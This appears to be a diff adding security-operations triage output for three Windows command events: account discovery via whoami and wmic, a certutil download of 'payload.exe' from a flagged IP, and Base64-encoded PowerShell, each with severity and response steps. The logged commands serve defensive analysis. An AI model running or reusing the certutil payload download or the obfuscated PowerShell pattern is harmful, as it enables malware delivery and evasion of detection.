@@ -1,0 +1,62 @@
+
+============================================================
+EVENT 1 — T1033
+Command: cmd.exe /c whoami & wmic useraccount get /ALL
+Threat Intel: No indicator to check
+------------------------------------------------------------
+## Triage Summary
+
+**1. WHAT HAPPENED**
+User `WINDOWS\khaled` ran `whoami` followed by a WMI command to enumerate all local user accounts, consistent with system owner/user discovery activity (T1033).
+
+**2. SEVERITY — Medium**
+Chaining `whoami` with `wmic useraccount get /ALL` suggests deliberate reconnaissance rather than accidental execution, which warrants closer scrutiny even without a threat intel hit.
+
+**3. RECOMMENDED ACTION**
+- Check `khaled`'s recent activity for additional discovery, lateral movement, or privilege escalation commands (T1069, T1087).
+- Confirm whether this aligns with a legitimate admin task or scheduled job.
+- If no business justification exists, escalate to Tier 2 for deeper investigation and consider alerting the user's manager.
+
+============================================================
+EVENT 2 — T1105
+Command: certutil -urlcache -split -f http://185.220.101.5/payload.exe evil.exe
+Threat Intel: IP: 9 security vendors flagged this as malicious | Hash: 65 security vendors flagged this as malicious
+------------------------------------------------------------
+## Triage Summary
+
+**1. WHAT HAPPENED**
+User `WINDOWS\khaled` used the built-in Windows tool `certutil.exe` to download a file named `evil.exe` from a known-malicious IP address (`185.220.101.5`), a classic Living-off-the-Land (LotL) technique for ingress tool transfer (T1105).
+
+---
+
+**2. SEVERITY — 🔴 HIGH**
+The downloaded file's hash is flagged by 65 security vendors as malicious, the source IP is flagged by 9 vendors, and use of `certutil` for downloads is a deliberate abuse of a trusted system binary to evade defenses.
+
+---
+
+**3. RECOMMENDED ACTION**
+- **Isolate the host immediately** to prevent lateral movement or payload execution.
+- Escalate to Tier 2/IR — do not wait; confirm whether `evil.exe` was executed (check process creation events, EDR telemetry).
+- Block `185.220.101.5` at the firewall/proxy if not already blocked.
+- Preserve the host image and collect artifacts (prefetch, event logs, MFT) for forensic analysis.
+- Review recent activity for user `khaled` across the environment for signs of compromise or insider threat.
+
+============================================================
+EVENT 3 — T1059.001
+Command: powershell.exe -e aQBwAGMAbwBuAGYAaQBnAA==
+Threat Intel: No indicator to check
+------------------------------------------------------------
+## Triage Summary
+
+**1. WHAT HAPPENED**
+A PowerShell process spawned a child PowerShell process using a Base64-encoded command (`-e` flag), which decodes to `ipconfig` — a basic network reconnaissance command.
+
+**2. SEVERITY — Low**
+The decoded command (`ipconfig`) is benign, but the use of Base64 encoding via a PowerShell-spawned-PowerShell is a common obfuscation pattern worth noting.
+
+**3. RECOMMENDED ACTION**
+- Confirm the decoded payload is truly just `ipconfig` (decode: `aQBwAGMAbwBuAGYAaQBnAA==` → `ipconfig`)
+- Check if `khaled` ran this manually or if it was triggered by a script/scheduled task
+- Review surrounding events (process tree, network activity, prior logon) for any additional suspicious behavior
+- If no further context raises concern, **close as informational** and consider flagging the user's account for light monitoring
+- Escalate to Tier 2 only if additional suspicious activity is found in the process timeline
